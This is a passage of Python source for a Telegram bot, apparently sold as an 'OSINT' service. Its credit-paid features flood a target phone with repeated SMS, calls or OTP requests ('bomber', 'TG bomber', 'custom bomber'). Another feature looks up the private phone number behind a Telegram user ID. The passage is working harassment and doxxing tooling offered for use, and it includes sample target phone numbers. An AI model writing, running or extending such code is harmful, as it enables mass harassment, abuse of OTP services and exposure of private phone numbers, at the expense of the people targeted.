        f"<tg-emoji emoji-id=\"{EMOJI_BLAST_NUMBER}\">📞</tg-emoji> ɴᴜᴍʙᴇʀ: {number}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BLAST_ROUND}\">🔄</tg-emoji> ʀᴏᴜɴᴅ: 1\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BLAST_DURATION}\">⏱</tg-emoji> ᴅᴜʀᴀᴛɪᴏɴ: {duration_text}\n"
        f"──────────────────\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BLAST_PROCESSING}\">⏳</tg-emoji> ᴘʀᴏᴄᴇssɪɴɢ...</blockquote>",
        reply_markup=stop_kb(),
        parse_mode=PM
    )

    blast_sessions[uid] = {
        "active": True,
        "msg_id": status_msg.message_id,
        "round": 1,
        "number": number,
        "chat_id": msg.chat.id,
        "duration": duration,
    }

    task = asyncio.create_task(run_blast(uid, number, msg.chat.id, status_msg.message_id, duration))
    blast_sessions[uid]["task"] = task

async def run_blast(uid: int, number: str, chat_id: int, msg_id: int, duration: int):
    start_time = time.time()
    round_num = 1

    while time.time() - start_time < duration:
        if not blast_sessions.get(uid, {}).get("active"):
            break

        try:
            url = f"{BOMBER_API}?key={BOMBER_KEY}&num={number}"
            async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                data = await resp.json()

            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            mins = remaining // 60
            secs = remaining % 60

            status_text = "✅ Sᴜᴄᴄᴇss" if data.get("success") else "❌ Fᴀɪʟᴇᴅ"
            message = data.get("message", "")

            await bot.edit_message_text(
                bq(
                    f"💥 ʙᴏᴍʙᴇʀ ʀᴜɴɴɪɴɢ\n"
                    f"──────────────────\n"
                    f"📞 ɴᴜᴍʙᴇʀ: {number}\n"
                    f"🔄 ʀᴏᴜɴᴅ: {round_num}\n"
                    f"⏱ ᴛɪᴍᴇ ʟᴇғᴛ: {mins}m {secs}s\n"
                    f"📊 sᴛᴀᴛᴜs: {status_text}\n"
                    f"──────────────────\n"
                    f"📝 {message}"
                ),
                chat_id=chat_id,
                message_id=msg_id,
                reply_markup=stop_kb(),
                parse_mode=PM
            )
        except Exception as e:
            pass

        round_num += 1
        blast_sessions[uid]["round"] = round_num
        await asyncio.sleep(BOMBER_INTERVAL)

    active = blast_sessions.get(uid, {}).get("active", False)
    blast_sessions.pop(uid, None)
    reason = "⏱ ᴛɪᴍᴇ'ᴜᴘ!" if active else "⛔ sᴛᴏᴘᴘᴇᴅ ʙʏ ʏᴏᴜ."
    u = get_user(uid)
    try:
        if is_owner(uid):
            credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
        else:
            credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else u['credits']
        
        await bot.edit_message_text(
            bq(
                f"💥 ʙᴏᴍʙᴇʀ ғɪɴɪsʜᴇᴅ\n"
                f"──────────────────\n"
                f"📞 ɴᴜᴍʙᴇʀ: {number}\n"
                f"✅ ʀᴏᴜɴᴅs: {round_num}\n"
                f"📌 {reason}\n"
                f"💳 ᴄʀᴇᴅɪᴛs: {credits_display}\n"
                f"──────────────────"
            ),
            chat_id=chat_id,
            message_id=msg_id,
            reply_markup=None,
            parse_mode=PM
        )
    except:
        pass

@dp.callback_query(F.data == "stop_blast")
async def cb_stop_blast(cb: CallbackQuery):
    uid = cb.from_user.id
    if uid in blast_sessions:
        blast_sessions[uid]["active"] = False
        if "task" in blast_sessions[uid]:
            blast_sessions[uid]["task"].cancel()
        await cb.answer("⛔ ʙʟᴀsᴛ sᴛᴏᴘᴘᴇᴅ!", show_alert=True)
    else:
        await cb.answer("ɴᴏ ᴀᴄᴛɪᴠᴇ ʙʟᴀsᴛ.", show_alert=True)

@dp.message(F.text == BTN_REDEEM)
async def rk_redeem(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    TICKET = "<tg-emoji emoji-id=\"5418010521309815154\">🎫</tg-emoji>"
    HEART = "<tg-emoji emoji-id=\"5278686562526184461\">🤍</tg-emoji>"
    LINE = "<tg-emoji emoji-id=\"5467641505525016018\">➿</tg-emoji>"
    DIAMOND = "<tg-emoji emoji-id=\"6026218958900695642\">💎</tg-emoji>"
    CIG = "<tg-emoji emoji-id=\"5282800338036873327\">🚬</tg-emoji>"
    MONEY = "<tg-emoji emoji-id=\"6082321071556532762\">💸</tg-emoji>"
    BOT = "<tg-emoji emoji-id=\"5355051922862653659\">🤖</tg-emoji>"
    STAR = "<tg-emoji emoji-id=\"6118385795976930086\">🌟</tg-emoji>"

    line = LINE * 10
    line_big = LINE * 12

    redeem_txt = (
        f"<blockquote>"
        f"{TICKET} <b>𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘</b> {HEART}\n"
        f"{line}\n"
        f"{DIAMOND} sᴇɴᴅ ʏᴏᴜʀ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ :-\n\n"
        f"{CIG} Exᴀᴍᴘʟᴇ :- OSINT-H1FH0S\n\n"
        f"{MONEY} Pʀᴇᴍɪᴜᴍ ᴄᴏᴅᴇ :- PREMIUM-XXXXX\n"
        f"{line_big}\n"
        f"{BOT} Pᴏᴡᴇʀᴇᴅ Bʏ : @ALLOSINTROBOT {STAR}\n"
        f"</blockquote>"
    )
    await msg.answer(redeem_txt, parse_mode=PM)
    await state.set_state(RedeemState.waiting_code)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   TG TO NUM HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_TG_TO_NUM)
async def rk_tg_to_num(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < TG_TO_NUM_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_TG_ORANGE_LINE}\">➿</tg-emoji>" * 7
    
    txt = (
        f"<blockquote>"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TG_TO_NUM}\">🙌</tg-emoji> <b>ᴛɢ ɪᴅ ᴛᴏ ɴᴜᴍ</b>\n"
        f"{orange_line}\n\n"
        f"<tg-emoji emoji-id=\"6266818250818983044\">💞</tg-emoji> 10 - ᴅɪɢɪᴛ ᴛɢ ᴜsᴇʀ ɪᴅ\n"
        f"<tg-emoji emoji-id=\"6131909286487399523\">🔔</tg-emoji> Exᴀᴍᴘʟᴇ:- 9876543210\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BRICK_PREMIUM}\">🧱</tg-emoji> Tᴏᴛᴀʟ :- {'♾️' if is_owner(uid) or is_premium(uid) else u['credits']} Cʀᴇᴅɪᴛ\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIFT_PREMIUM}\">🎁</tg-emoji> Pᴇʀ-Usᴇ :- {'FREE' if is_owner(uid) or is_premium(uid) else TG_TO_NUM_COST} Cʀᴇᴅɪᴛs\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>\n"
        f"{orange_line}\n"
        f"</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "tg_to_num", txt)
    await state.set_state(TgToNumState.waiting_userid)

@dp.message(TgToNumState.waiting_userid, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_tg_to_num(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    user_id_input = msg.text.strip()
    
    if not user_id_input.isdigit():
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍᴇʀɪᴄ ᴛɢ ᴜsᴇʀ ɪᴅ."
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < TG_TO_NUM_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    if is_user_secured(int(user_id_input)):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This user ID is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return
    
    await log_search(uid, msg.from_user.username or "", user_id_input)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> ᴘʀᴏᴄᴇssɪɴɢ..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    credits_deducted = False
    
    try:
        url = f"{TG_TO_NUM_API}?key={TG_TO_NUM_KEY}&userid={user_id_input}"
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            data = await resp.json()
        
        await proc.delete()
        
        if data.get("status") and data.get("phone"):
            if not is_owner(uid) and not is_premium(uid):
                deduct_credits(uid, TG_TO_NUM_COST)
                credits_deducted = True
            await msg.answer(
                format_tg_to_num_response(data, user_id_input),
                parse_mode=PM
            )
        else:
            await msg.answer(
                bq("❌ ɴᴏ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ғᴏᴜɴᴅ ғᴏʀ ᴛʜɪs ᴛɢ ɪᴅ. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."),
                parse_mode=PM
            )
            
    except Exception as e:
        await proc.delete()
        await msg.answer(
            bq(f"❌ ᴇʀʀᴏʀ: {str(e)[:100]}. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."),
            parse_mode=PM
        )
    
    u2 = get_user(uid)
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u2['credits'])
    
    if credits_deducted:
        await answer_with_main(
            msg,
            bq(f"💳 ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs: {credits_display}"),
            parse_mode=PM,
        )
    await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🆕 TG BOMBER HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_TG_BOMBER)
async def rk_tg_bomber(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < TG_BOMBER_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_owner(uid) or is_premium(uid) else str(u['credits'])
    
    L = f"<tg-emoji emoji-id=\"{EMOJI_TGB_LINE}\">➿</tg-emoji>"
    line_big = L * 12
    line_small = L * 10
    
    txt = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_CHECK_HEAD}\">✔️</tg-emoji><b>𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗕𝗢𝗠𝗕𝗘𝗥</b>\n"
        f"{line_big}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_BEAR}\">🐻</tg-emoji>sᴇɴᴅ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ :\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_SMILE}\">😄</tg-emoji>ᴇxᴀᴍᴘʟᴇ -: +918482058149\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_APPLE}\">🍏</tg-emoji>ᴄʀᴇᴅɪᴛs : {credits_display} <tg-emoji emoji-id=\"{EMOJI_TGB_CHECK_GREEN}\">✅</tg-emoji>\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_DIAMOND}\">💎</tg-emoji>ᴘᴇʀ ʙᴏᴍʙ -: {TG_BOMBER_COST} ᴄʀᴇᴅɪᴛs\n"
        f"{line_small}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_TGB_BOT}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT <tg-emoji emoji-id=\"{EMOJI_TGB_STAR}\">🌟</tg-emoji>\n"
        f"{line_small}\n"
        f"</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "tg_bomber", txt)
    await state.set_state(TgBomberState.waiting_number)

@dp.message(TgBomberState.waiting_number, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_tg_bomber_number(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    number = msg.text.strip()
    
    # Validate: must start with + and rest digits
    if not number.startswith("+"):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! ᴘʟᴇᴀsᴇ ᴜsᴇ ғᴏʀᴍᴀᴛ: +919165264010"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    clean = number[1:]
    if not clean.isdigit():
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! ᴏɴʟʏ ᴅɪɢɪᴛs ᴀʟʟᴏᴡᴇᴅ ᴀғᴛᴇʀ +."
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    if len(clean) < 10 or len(clean) > 15:
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ."
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    if is_number_secured(clean):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return
    
    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < TG_BOMBER_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    await state.clear()
    await log_search(uid, msg.from_user.username or "", number)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> ᴘʀᴏᴄᴇssɪɴɢ..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    try:
        url = f"{TG_BOMBER_API}?key={TG_BOMBER_KEY}&number={number}&count={TG_BOMBER_COUNT}"
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
            data = await resp.json(content_type=None)
        
        try:
            await proc.delete()
        except:
            pass
        
        # Deduct credits (only if not owner/premium)
        if not is_owner(uid) and not is_premium(uid):
            deduct_credits(uid, TG_BOMBER_COST)
        
        success_count = int(data.get("otp_sent", 0) or 0)
        failed_count = int(data.get("failed", 0) or 0)
        
        # If API returned "success" key only, use that
        if success_count == 0 and failed_count == 0:
            if data.get("success"):
                success_count = TG_BOMBER_COUNT
                failed_count = 0
            else:
                success_count = 0
                failed_count = TG_BOMBER_COUNT
        
        u2 = get_user(uid)
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_owner(uid) or is_premium(uid) else str(u2['credits'])
        
        L = f"<tg-emoji emoji-id=\"{EMOJI_TGB_LINE}\">➿</tg-emoji>"
        line_big = L * 12
        line_small = L * 11
        
        result_txt = (
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_TGB_SUCCESS_TOP}\">✅</tg-emoji><b>𝗧𝗚 𝗕𝗢𝗠𝗕𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬</b>\n"
            f"{line_big}\n"
            f"<tg-emoji emoji-id=\"{EMOJI_TGB_SUCCESS_CHECK}\">✅</tg-emoji> Sᴜᴄᴄᴇss -: {success_count}\n"
            f"<tg-emoji emoji-id=\"{EMOJI_TGB_CRY}\">😭</tg-emoji> Fᴀɪʟᴇᴅ -: {failed_count}\n"
            f"{line_big}\n"
            f"<tg-emoji emoji-id=\"{EMOJI_TGB_SAD}\">😞</tg-emoji> Yᴏᴜʀ ᴄʀᴇᴅɪᴛs : {credits_display}\n\n"
            f"<tg-emoji emoji-id=\"{EMOJI_TGB_BOT}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ : @ALLOSINTROBOT\n"
            f"{line_small}\n"
            f"</blockquote>"
        )
        await msg.answer(result_txt, parse_mode=PM)
        
    except Exception as e:
        try:
            await proc.delete()
        except:
            pass
        await msg.answer(
            bq(f"❌ ᴇʀʀᴏʀ: {str(e)[:150]}"),
            parse_mode=PM
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   CUSTOM BOMBER HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_CUSTOM_BOMBER)
async def rk_custom_bomber(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < 1:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    line = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_LINE}\">➿</tg-emoji>" * 11
    
    txt = (
        f"<blockquote>"
        f"{line}\n"
        f"  <tg-emoji emoji-id=\"{CUSTOM_EMOJI_SAD}\">😞</tg-emoji><b>𝗖𝗢𝗨𝗦𝗧𝗢𝗠 𝗕𝗢𝗠𝗕𝗘𝗥</b>\n\n"
        f"sᴇɴᴅ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ <tg-emoji emoji-id=\"{CUSTOM_EMOJI_SKULL}\">💀</tg-emoji>\n\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_MEGAPHONE}\">📣</tg-emoji>Exᴀᴍᴘʟᴇ -: +917840284919\n\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_GIFT}\">🎁</tg-emoji>Tᴏᴛᴀʟ -: 13\n\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_GIFT}\">🎁</tg-emoji>Pᴇʀ ᴜsᴇ -: 2 Cʀᴇᴅɪᴛs\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>\n"
        f"{line}\n"
        f"</blockquote>"
    )
    
    await send_dashboard_media(bot, msg.chat.id, "custom_bomber", txt, parse_mode=PM)
    await state.set_state(CustomBomberState.waiting_number)

@dp.message(CustomBomberState.waiting_number, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_custom_bomber_number(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    number = msg.text.strip()
    
    if not number.startswith("+") or not number[1:].isdigit():
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ! ᴘʟᴇᴀsᴇ ᴜsᴇ ғᴏʀᴍᴀᴛ: +919876543210"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    clean_number = number.replace("+", "")
    if is_number_secured(clean_number):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return
    
    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < 1:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    await state.update_data(target_number=number)
    
    phone_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_PHONE}\">📞</tg-emoji>"
    chat_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_CHAT}\">💬</tg-emoji>"
    
    await msg.answer(
        f"<blockquote>"
        f"{phone_emoji}Tᴀʀɢᴇᴛ Pʜᴏɴᴇ: {number}\n\n"
        f"{chat_emoji} Nᴏᴡ ᴇɴᴛᴇʀ ʏᴏᴜʀ sᴍs ᴍᴇssᴀɢᴇ ʙᴇʟᴏᴡ :\n"
        f"</blockquote>",
        parse_mode=PM
    )
    await state.set_state(CustomBomberState.waiting_message)

@dp.message(CustomBomberState.waiting_message, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_custom_bomber_message(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    message_text = msg.text.strip()
    if not message_text:
        await msg.answer(bq("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇ!"), parse_mode=PM)
        return
    
    await state.update_data(target_message=message_text)
    
    line = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_LINE}\">➿</tg-emoji>" * 11
    wink_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_WINK}\">😉</tg-emoji>"
    comet_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_COMET}\">☄️</tg-emoji>"
    
    await msg.answer(
        f"<blockquote>"
        f"{line}\n"
        f"Hᴏᴡ ᴍᴀɴʏ ᴛɪᴍᴇs ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴍᴇssᴀɢᴇs ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ {wink_emoji} \n\n"
        f"{comet_emoji}Sᴇɴᴅ ᴄᴏᴜɴᴛ :\n"
        f"{line}\n"
        f"</blockquote>",
        parse_mode=PM
    )
    await state.set_state(CustomBomberState.waiting_count)

@dp.message(CustomBomberState.waiting_count, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_custom_bomber_count(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    if not msg.text.isdigit() or int(msg.text) <= 0:
        await msg.answer(bq("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴄᴏᴜɴᴛ (ᴘᴏsɪᴛɪᴠᴇ ɴᴜᴍʙᴇʀ)!"), parse_mode=PM)
        return
    
    count = int(msg.text)
    data = await state.get_data()
    number = data.get("target_number")
    message_text = data.get("target_message")
    
    u = get_user(msg.from_user.id)
    if not u:
        await state.clear()
        return
    
    if not is_owner(msg.from_user.id) and not is_premium(msg.from_user.id):
        if u["credits"] < count:
            await msg.answer(
                bq(f"❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ! ɴᴇᴇᴅ {count} ᴄʀᴇᴅɪᴛs, ʜᴀᴠᴇ {u['credits']}."),
                parse_mode=PM
            )
            await state.clear()
            return
        deduct_credits(msg.from_user.id, count)
    
    await state.update_data(target_count=count)
    
    wink_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_WINK}\">😉</tg-emoji>"
    
    await msg.answer(
        f"{wink_emoji}  Aᴛ ᴡʜᴀᴛ sᴘᴇᴇᴅ ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ʏᴏ sᴇɴᴅ ᴍᴇssᴀɢᴇs :",
        reply_markup=custom_bomber_speed_kb(),
        parse_mode=PM
    )
    await state.set_state(CustomBomberState.waiting_speed)

@dp.callback_query(F.data == "custom_bomber_fast")
async def cb_custom_bomber_fast(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    await process_custom_bomber(cb.message, state, "fast")

@dp.callback_query(F.data == "custom_bomber_slow")
async def cb_custom_bomber_slow(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    await process_custom_bomber(cb.message, state, "slow")

async def process_custom_bomber(msg: Message, state: FSMContext, speed: str):
    data = await state.get_data()
    number = data.get("target_number")
    message_text = data.get("target_message")
    count = data.get("target_count")
    
    if not all([number, message_text, count]):
        await msg.answer(bq("❌ Sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ! Pʟᴇᴀsᴇ sᴛᴀʀᴛ ᴀɢᴀɪɴ."), parse_mode=PM)
        await state.clear()
        return
    
    await state.clear()
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> Sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    try:
        if speed == "fast":
            half_count = count // 2
            device1_count = half_count
            device2_count = count - half_count
            
            tasks = []
            if device1_count > 0:
                url1 = f"{CUSTOM_BOMBER_API}?number={number}&count={device1_count}&msg={message_text}"
                tasks.append(http_session.get(url1, timeout=aiohttp.ClientTimeout(total=120)))
            if device2_count > 0:
                url2 = f"{CUSTOM_BOMBER_API}?number={number}&count={device2_count}&msg={message_text}"
                tasks.append(http_session.get(url2, timeout=aiohttp.ClientTimeout(total=120)))
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            total_success = 0
            total_failed = 0
            
            for resp in responses:
                if isinstance(resp, Exception):
                    continue
                try:
                    data = await resp.json()
                    if data.get("success"):
                        total_success += data.get("sent", 0)
                        total_failed += data.get("failed", 0)
                    else:
                        total_failed += data.get("requested", 0)
                except:
                    pass
        else:
            url = f"{CUSTOM_BOMBER_API}?number={number}&count={count}&msg={message_text}"
            async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                response_data = await resp.json()
                
                if response_data.get("success"):
                    total_success = response_data.get("sent", 0)
                    total_failed = response_data.get("failed", 0)
                else:
                    total_success = 0
                    total_failed = count
        
        await proc.delete()
        
        line = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_LINE}\">➿</tg-emoji>" * 11
        check_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_CHECK}\">✅</tg-emoji>"
        tick_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_TICK}\">✔️</tg-emoji>"
        cry_emoji = f"<tg-emoji emoji-id=\"{CUSTOM_EMOJI_CRY}\">😭</tg-emoji>"
        bot_emoji = f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji>"
        star_emoji = f"<tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>"
        
        result_text = (
            f"<blockquote>"
            f"{line}\n"
            f"Cᴏᴜsᴛᴏᴍ ʙᴏᴍʙᴇʀ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ {check_emoji}\n\n"
            f"{tick_emoji}Sᴜᴄᴄᴇss -: {total_success}\n"
            f"{cry_emoji} Fᴀɪʟᴇᴅ -: {total_failed} \n\n"
            f"{bot_emoji} Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT  {star_emoji}\n"
            f"{line}\n"
            f"</blockquote>"
        )
        
        await msg.answer(result_text, parse_mode=PM)
        
        await log_search(msg.from_user.id, msg.from_user.username or "", 
                        f"Custom Bomber: {number} | Count: {count} | Speed: {speed} | Success: {total_success} | Failed: {total_failed}")
        
    except Exception as e:
        await proc.delete()
        await msg.answer(
            bq(f"❌ ᴇʀʀᴏʀ: {str(e)[:200]}"),
            parse_mode=PM
        )

